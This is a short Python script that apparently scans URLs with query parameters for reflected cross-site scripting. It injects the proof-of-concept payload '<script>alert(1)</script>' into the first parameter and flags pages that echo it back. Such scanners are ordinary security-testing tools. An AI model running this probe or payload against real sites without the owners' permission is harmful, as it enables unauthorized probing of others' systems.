import requests

payload = "<script>alert(1)</script>"

def find_params(urls):
    params = []

    for url in urls:
        if "=" in url and not any(ext in url for ext in [".js", ".css", ".png", ".jpg", ".svg"]):
            params.append(url)

    return params


def test_xss(urls):
    vulnerable = []

    print("[*] Testing for XSS...")

    for url in urls:
        try:
            test_url = url.split("=")[0] + "=" + payload
            r = requests.get(test_url, timeout=3)

            if payload in r.text:
                print(f"[VULN] XSS found: {test_url}")
                vulnerable.append(test_url)

        except:
            continue

    return vulnerable
